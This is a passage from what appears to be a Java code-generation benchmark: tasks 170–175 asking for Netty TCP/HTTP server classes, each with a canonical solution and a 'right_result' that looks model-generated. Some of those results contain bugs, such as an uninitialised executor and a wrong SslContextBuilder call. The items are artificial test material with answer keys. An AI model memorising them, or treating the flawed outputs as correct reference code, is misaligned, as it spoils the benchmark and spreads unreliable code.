    "right_result": "```java\nimport java.io.Closeable;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.WritableByteChannel;\nimport java.nio.channels.ReadableByteChannel;\nimport java.nio.MappedByteBuffer;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.Set;\n\npublic class TranslogFileChannel implements Closeable {\n    private final Path location;\n    private final FileChannel channel;\n\n    public TranslogFileChannel(Path location) throws IOException {\n        this.location = location;\n        this.channel = FileChannel.open(location, StandardOpenOption.READ, StandardOpenOption.WRITE);\n    }\n\n    public void write(ByteBuffer src) throws IOException {\n        channel.write(src);\n    }\n\n    public int read(ByteBuffer dst) throws IOException {\n        return channel.read(dst);\n    }\n\n    public long position() throws IOException {\n        return channel.position();\n    }\n\n    public void position(long newPosition) throws IOException {\n        channel.position(newPosition);\n    }\n\n    public long size() throws IOException {\n        return channel.size();\n    }\n\n    public void truncate(long size) throws IOException {\n        channel.truncate(size);\n    }\n\n    public void force(boolean metaData) throws IOException {\n        channel.force(metaData);\n    }\n\n    public long transferTo(long position, long count, WritableByteChannel target) throws IOException {\n        return channel.transferTo(position, count, target);\n    }\n\n    public long transferFrom(ReadableByteChannel src, long position, long count) throws IOException {\n        return channel.transferFrom(src, position, count);\n    }\n\n    public MappedByteBuffer map(FileChannel.MapMode mode, long position, long size) throws IOException {\n        return channel.map(mode, position, size);\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (channel != null) {\n            channel.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 170,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling HTTP requests with optional SSL encryption.\n\nClass Description: The HttpSnoopServer class is a Netty-based HTTP server that can operate in both secure (HTTPS) and non-secure (HTTP) modes. It uses a boss-worker thread model for handling connections and includes SSL support through self-signed certificates when enabled.\n\nAttributes:\n- SSL: static final boolean - Determines whether SSL encryption should be enabled (configured via system property \"ssl\")\n- PORT: static final int - The port number the server will listen on (configured via system property \"port\", defaults to 8443 for SSL or 8080 for non-SSL)\n\nMethods:\n- start(): void - Starts the HTTP server with the configured settings. Throws Exception if server startup fails.\n  - Initializes SSL context if enabled\n  - Sets up boss and worker event loop groups\n  - Configures server bootstrap with channel type and handlers\n  - Binds to specified port and starts accepting connections\n  - Handles graceful shutdown of resources",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class HttpSnoopServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL? \"8443\" : \"8080\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new HttpSnoopServerInitializer(sslCtx));\n\n            Channel ch = b.bind(PORT).sync().channel();\n\n            System.err.println(\"Open your web browser and navigate to \" +\n                    (SSL? \"https\" : \"http\") + \"://127.0.0.1:\" + PORT + '/');\n\n            ch.closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic class HttpSnoopServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL ? \"8443\" : \"8080\"));\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) {\n                     if (SSL) {\n                         ch.pipeline().addLast(SslContextBuilder.forServer(getSelfSignedCertificate()).build().newHandler(ch.alloc()));\n                     }\n                     ch.pipeline().addLast(new HttpRequestDecoder());\n                     ch.pipeline().addLast(new HttpObjectAggregator(65536));\n                     ch.pipeline().addLast(new HttpResponseEncoder());\n                     ch.pipeline().addLast(new HttpSnoopServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    private SelfSignedCertificate getSelfSignedCertificate() throws Exception {\n        return new SelfSignedCertificate();\n    }\n\n    public static void main(String[] args) throws Exception {\n        new HttpSnoopServer().start();\n    }\n}\n```"
  },
  {
    "Task_id": 171,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using the Netty framework to handle incoming client connections and process requests.\n\nClass Description: The `JacksonServer` class is a Netty-based TCP server that listens on a specified port for incoming client connections. It uses a boss-worker thread model to handle connections efficiently and includes logging for monitoring server activity. The server is designed to be gracefully shutdown when no longer needed.\n\nAttributes:\n- PORT: [int] - The port number on which the server will listen for incoming connections (default: 8082).\n\nMethods:\n- start(): [void] - Initializes and starts the Netty TCP server. It sets up the server configuration, binds to the specified port, and keeps the server running until it is shutdown. This method throws Exception if any error occurs during server startup or operation.\n  - Input: None\n  - Output: None (but may throw Exception)",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\npublic final class JacksonServer {\n\n    static final int PORT = 8082;\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .childOption(ChannelOption.SO_KEEPALIVE, true)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new JacksonServerInitializer());\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\npublic class JacksonServer {\n    private static final int PORT = 8082;\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     // Add custom handlers for processing client requests here\n                 }\n             });\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 172,
    "Instruction": "Task Description: Implement a Netty-based TCP server class that handles RPC (Remote Procedure Call) requests and responses, including server startup, shutdown, and connection management.\n\nClass Description: NettyServer is a TCP server implementation using Netty framework that provides RPC functionality. It manages server lifecycle, connection handling, and request processing through a thread pool.\n\nAttributes:\n- thread: Thread - The thread running the Netty server instance\n\nMethods:\n- start(XxlRpcProviderFactory) -> void - Starts the Netty server with the specified RPC provider configuration. Initializes thread pools, event loops, and server bootstrap.\n  Input: \n    - xxlRpcProviderFactory: XxlRpcProviderFactory - Configuration factory providing server parameters and serializer\n  Output: None (server runs asynchronously in background thread)\n\n- stop() -> void - Stops the Netty server gracefully by interrupting the server thread and shutting down resources.\n  Input: None\n  Output: None (performs cleanup operations)\n\nThe class should handle:\n1. Server bootstrap configuration with NIO transport\n2. Connection pipeline setup with idle state detection\n3. Request/response serialization\n4. Thread pool management for request processing\n5. Graceful shutdown procedures",
    "Canonical_solution": "import com.wugui.datax.rpc.remoting.net.params.XxlRpcRequest;\nimport com.wugui.datax.rpc.remoting.net.params.XxlRpcResponse;\nimport com.wugui.datax.rpc.remoting.provider.XxlRpcProviderFactory;\nimport com.wugui.datax.rpc.util.ThreadPoolUtil;\nimport com.wugui.datax.rpc.remoting.net.Server;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.timeout.IdleStateHandler;\n\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyServer extends Server {\n\n    private Thread thread;\n\n    @Override\n    public void start(final XxlRpcProviderFactory xxlRpcProviderFactory) throws Exception {\n        thread = new Thread(new Runnable() {\n            @Override\n            public void run() {\n                final ThreadPoolExecutor serverHandlerPool = ThreadPoolUtil.makeServerThreadPool(\n                        NettyServer.class.getSimpleName(),\n                        xxlRpcProviderFactory.getCorePoolSize(),\n                        xxlRpcProviderFactory.getMaxPoolSize());\n                EventLoopGroup bossGroup = new NioEventLoopGroup();\n                EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n                try {\n                    ServerBootstrap bootstrap = new ServerBootstrap();\n                    bootstrap.group(bossGroup, workerGroup)\n                            .channel(NioServerSocketChannel.class)\n                            .childHandler(new ChannelInitializer<SocketChannel>() {\n                                @Override\n                                public void initChannel(SocketChannel channel) throws Exception {\n                                    channel.pipeline()\n                                            .addLast(new IdleStateHandler(0,0, Beat.BEAT_INTERVAL*3, TimeUnit.SECONDS))\n                                            .addLast(new NettyDecoder(XxlRpcRequest.class, xxlRpcProviderFactory.getSerializerInstance()))\n                                            .addLast(new NettyEncoder(XxlRpcResponse.class, xxlRpcProviderFactory.getSerializerInstance()))\n                                            .addLast(new NettyServerHandler(xxlRpcProviderFactory, serverHandlerPool));\n                                }\n                            })\n                            .childOption(ChannelOption.TCP_NODELAY, true)\n                            .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n                    ChannelFuture future = bootstrap.bind(xxlRpcProviderFactory.getPort()).sync();\n                    onStarted();\n                    future.channel().closeFuture().sync();\n                } catch (Exception e) {\n                    if (e instanceof InterruptedException) {\n                        logger.info(\">>>>>>>>>>> xxl-rpc remoting server stop.\");\n                    } else {\n                        logger.error(\">>>>>>>>>>> xxl-rpc remoting server error.\", e);\n                    }\n                } finally {\n                    try {\n                        serverHandlerPool.shutdown();\n                    } catch (Exception e) {\n                        logger.error(e.getMessage(), e);\n                    }\n                    try {\n                        workerGroup.shutdownGracefully();\n                        bossGroup.shutdownGracefully();\n                    } catch (Exception e) {\n                        logger.error(e.getMessage(), e);\n                    }\n                }\n            }\n        });\n        thread.setDaemon(true);\n        thread.start();\n    }\n\n    @Override\n    public void stop() throws Exception {\n        if (thread != null && thread.isAlive()) {\n            thread.interrupt();\n        }\n        onStopped();\n        logger.info(\">>>>>>>>>>> xxl-rpc remoting server destroy success.\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.timeout.IdleStateHandler;\n\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.ThreadFactory;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class NettyServer {\n    private final Thread thread;\n    private final AtomicBoolean started = new AtomicBoolean(false);\n    private ExecutorService executorService;\n    private XxlRpcProviderFactory xxlRpcProviderFactory;\n\n    public NettyServer() {\n        this.thread = new Thread(this::run);\n        this.thread.setDaemon(true);\n    }\n\n    public void start(XxlRpcProviderFactory xxlRpcProviderFactory) {\n        if (!started.compareAndSet(false, true)) {\n            return;\n        }\n        this.xxlRpcProviderFactory = xxlRpcProviderFactory;\n        thread.start();\n    }\n\n    public void stop() {\n        if (started.get()) {\n            started.set(false);\n            thread.interrupt();\n            try {\n                if (executorService != null) {\n                    executorService.shutdownNow();\n                }\n            } catch (Exception e) {\n                // ignore\n            }\n        }\n    }\n\n    private void run() {\n        NioEventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        NioEventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ChannelPipeline pipeline = ch.pipeline();\n                            pipeline.addLast(\"idleStateHandler\", new IdleStateHandler(0, 0, 60));\n                            pipeline.addLast(\"decoder\", xxlRpcProviderFactory.getSerializer().getDecoder());\n                            pipeline.addLast(\"encoder\", xxlRpcProviderFactory.getSerializer().getEncoder());\n                            pipeline.addLast(\"handler\", new RpcServerHandler(executorService, xxlRpcProviderFactory));\n                        }\n                    })\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture future = bootstrap.bind(xxlRpcProviderFactory.getPort()).sync();\n            if (started.get()) {\n                future.channel().closeFuture().sync();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    static class RpcServerHandler extends SimpleChannelInboundHandler<Object> {\n        private final ExecutorService executorService;\n        private final XxlRpcProviderFactory providerFactory;\n\n        RpcServerHandler(ExecutorService executorService, XxlRpcProviderFactory providerFactory) {\n            this.executorService = executorService;\n            this.providerFactory = providerFactory;\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {\n            executorService.submit(() -> {\n                try {\n                    Object result = providerFactory.getInvoker(msg).invoke();\n                    ctx.writeAndFlush(result);\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            });\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 173,
    "Instruction": "Task Description: Implement a TCP server using Java Netty framework that echoes back any received messages to the client. The server should be configurable to run on any specified port and should properly handle resource cleanup during shutdown.\n\nClass Description: EchoServer is a Netty-based TCP server implementation that listens for incoming connections, processes received messages by echoing them back, and manages server lifecycle including startup and graceful shutdown.\n\nAttributes:\n- DEFAULT_PORT: int - The default port number (7) to use when no port is specified\n- bossGroup: EventLoopGroup - The parent event loop group that accepts incoming connections\n- workerGroup: EventLoopGroup - The child event loop group that handles the traffic of accepted connections\n- bootstrap: ServerBootstrap - The server bootstrap instance used to configure and start the server\n\nMethods:\n- EchoServer() -> None - Constructor that initializes the event loop groups and server bootstrap\n- start(int port) -> void - Starts the server on the specified port, configures channel options and handlers, and binds to the port\n  Input: port (int) - The port number to bind the server to\n- stop() -> void - Shuts down the event loop groups gracefully to release all resources\n- main(String[] args) -> void - Entry point that creates and starts the server instance\n  Input: args (String[]) - Command line arguments (optional port number)\n  Output: None (runs indefinitely until terminated)",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class EchoServer {\n\n    public static int DEFAULT_PORT = 7;\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public EchoServer() {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n        bootstrap = new ServerBootstrap();\n    }\n\n    public void start(int port) throws InterruptedException {\n        try {\n            bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new EchoServerChannelInitializer())\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = bootstrap.bind(port).sync();\n            System.out.println(\"EchoServer\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n            f.channel().closeFuture().sync();\n        } finally {\n            stop();\n        }\n    }\n\n    public void stop() {\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port = args.length > 0 ? Integer.parseInt(args[0]) : DEFAULT_PORT;\n        EchoServer server = new EchoServer();\n        server.start(port);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\npublic class EchoServer {\n    public static final int DEFAULT_PORT = 7;\n\n    private final EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n    private final EventLoopGroup workerGroup = new NioEventLoopGroup();\n    private final ServerBootstrap bootstrap = new ServerBootstrap();\n\n    public EchoServer() {\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .option(ChannelOption.SO_BACKLOG, 100)\n                .handler(new LoggingHandler(LogLevel.INFO))\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast((io.netty.channel.ChannelHandler) new io.netty.example.echo.EchoServerHandler());\n                    }\n                });\n    }\n\n    public void start(int port) {\n        try {\n            ChannelFuture f = bootstrap.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n    public static void main(String[] args) {\n        int port = DEFAULT_PORT;\n        if (args.length > 0) {\n            try {\n                port = Integer.parseInt(args[0]);\n            } catch (NumberFormatException e) {\n                System.err.println(\"Invalid port: \" + args[0]);\n                System.exit(1);\n            }\n        }\n\n        EchoServer server = new EchoServer();\n        server.start(port);\n        server.stop();\n    }\n}\n```"
  },
  {
    "Task_id": 174,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and manage communication protocols.\n\nClass Description: RemoteServer is a TCP server implementation using Netty framework that listens on a specified port, manages client connections, and maintains a list of communication protocols. It extends BaseServer for basic server functionality.\n\nAttributes:\n- port: int - The port number on which the server listens for incoming connections\n- protocolList: List<Protocol> - A list to maintain active communication protocols between clients and browsers\n\nMethods:\n- RemoteServer(int port) -> [Constructor] - Initializes the server with the specified port and creates an empty protocol list\n- listen(int port) -> void - Sets the server's listening port\n- start() -> void - Starts the Netty server, configures the server bootstrap with worker groups, channel type, and handlers, then binds to the specified port\n- findProtocolByBrowser(ChannelHandlerContext ctx) -> Protocol - Finds and returns a protocol associated with a browser's channel context\n- findProtocolByKey(String key) -> Protocol - Finds and returns a protocol associated with a specific key\n- findProtocolByClient(ChannelHandlerContext ctx) -> Protocol - Finds and returns a protocol associated with a client's channel context",
    "Canonical_solution": "import com.yeetor.androidcontrol.*;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.util.LinkedList;\nimport java.util.List;\n\npublic class RemoteServer extends BaseServer {\n    private int port = -1;\n    List<Protocol> protocolList;\n\n    public RemoteServer(int port) {\n        listen(port);\n        protocolList = new LinkedList<Protocol>();\n    }\n\n    public void listen(int port) {\n        this.port = port;\n    }\n\n    public void start() throws InterruptedException {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childOption(ChannelOption.SO_KEEPALIVE, true)\n                .childHandler(new ChildChannel(new RemoteServerWebsocketEventImp()));\n\n        ChannelFuture future = bootstrap.bind(port).sync();\n        future.channel().closeFuture().sync();\n    }\n\n    private Protocol findProtocolByBrowser(ChannelHandlerContext ctx) {\n        for (Protocol protocol : protocolList) {\n            if (protocol.getBroswerSocket() != null && protocol.getBroswerSocket() == ctx) {\n                return protocol;\n            }\n        }\n        return null;\n    }\n\n    private Protocol findProtocolByKey(String key) {\n        for (Protocol protocol : protocolList) {\n            if (protocol.getBroswerSocket() != null && StringUtils.equals(key, protocol.getKey())) {\n                return protocol;\n            }\n        }\n        return null;\n    }\n\n    private Protocol findProtocolByClient(ChannelHandlerContext ctx) {\n        for (Protocol protocol : protocolList) {\n            if (protocol.getClientSocket() != null && protocol.getClientSocket() == ctx) {\n                return protocol;\n            }\n        }\n        return null;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.util.List;\nimport java.util.ArrayList;\n\npublic class RemoteServer extends BaseServer {\n    private int port;\n    private List<Protocol> protocolList;\n\n    public RemoteServer(int port) {\n        this.port = port;\n        this.protocolList = new ArrayList<>();\n    }\n\n    public void listen(int port) {\n        this.port = port;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) {\n                     ChannelPipeline pipeline = ch.pipeline();\n                     pipeline.addLast(new RemoteServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public Protocol findProtocolByBrowser(ChannelHandlerContext ctx) {\n        for (Protocol protocol : protocolList) {\n            if (protocol.getBrowserChannelContext() == ctx) {\n                return protocol;\n            }\n        }\n        return null;\n    }\n\n    public Protocol findProtocolByKey(String key) {\n        for (Protocol protocol : protocolList) {\n            if (key.equals(protocol.getKey())) {\n                return protocol;\n            }\n        }\n        return null;\n    }\n\n    public Protocol findProtocolByClient(ChannelHandlerContext ctx) {\n        for (Protocol protocol : protocolList) {\n            if (protocol.getClientChannelContext() == ctx) {\n                return protocol;\n            }\n        }\n        return null;\n    }\n\n    private class RemoteServerHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            // Handle incoming messages\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 175,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling multiple client connections with configurable channel handlers.\n\nClass Description: MockTcpServer is a Netty-based TCP server implementation that provides flexible handler configuration and proper resource management. It uses NIO event loop groups for efficient connection handling and includes graceful shutdown capabilities.\n\nAttributes:\n- bossGroup: [NioEventLoopGroup] - Handles incoming connection requests and accepts them\n- workerGroup: [NioEventLoopGroup] - Handles the traffic of accepted connections\n- channel: [Channel] - Represents the server's listening channel\n- handlers: [List<Supplier<? extends ChannelHandler>>] - List of handler suppliers for processing incoming data\n\nMethods:\n- addHandler(Supplier<? extends ChannelHandler> supplier) -> [void] - Adds a channel handler supplier to the pipeline configuration\n- initialize(int port) -> [void] throws InterruptedException - Starts the server on specified port and initializes all configured handlers\n- shutdown() -> [void] - Closes the server channel and triggers graceful shutdown of event loops\n- Resources (static inner class) -> [NioEventLoopGroup] - Manages shared event loop groups and shutdown hooks for resource cleanup",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.util.concurrent.DefaultThreadFactory;\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.concurrent.TimeUnit;\nimport java.util.function.Supplier;\n\npublic class MockTcpServer {\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private Channel channel;\n    private List<Supplier<? extends ChannelHandler>> handlers = new ArrayList<>();\n\n    public void addHandler(Supplier<? extends ChannelHandler> supplier) {\n        handlers.add(supplier);\n    }\n\n    public void initialize(int port) throws InterruptedException {\n        bossGroup = Resources.bossGroup;\n        workerGroup = Resources.workerGroup;\n\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(bossGroup, workerGroup)\n         .channel(NioServerSocketChannel.class)\n         .option(ChannelOption.SO_BACKLOG, 100)\n         .childHandler(new ChannelInitializer<SocketChannel>() {\n             @Override\n             public void initChannel(SocketChannel ch) {\n                 ChannelPipeline p = ch.pipeline();\n                 for (Supplier<? extends ChannelHandler> handler : handlers) {\n                     p.addLast(handler.get());\n                 }\n             }\n         });\n\n        ChannelFuture f = b.bind(port).sync();\n        channel = f.channel();\n    }\n\n    public void shutdown() {\n        channel.close();\n    }\n\n    private static class Resources {\n        private static final EventLoopGroup bossGroup;\n        private static final EventLoopGroup workerGroup;\n\n        static {\n            bossGroup = new NioEventLoopGroup(1, new DefaultThreadFactory(NioEventLoopGroup.class, true));\n            workerGroup = new NioEventLoopGroup(5, new DefaultThreadFactory(NioEventLoopGroup.class, true));\n\n            Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n                bossGroup.shutdownGracefully(0, 0, TimeUnit.MILLISECONDS);\n                workerGroup.shutdownGracefully(0, 0, TimeUnit.MILLISECONDS);\n            }, \"MockRedisServer-shutdown\"));\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
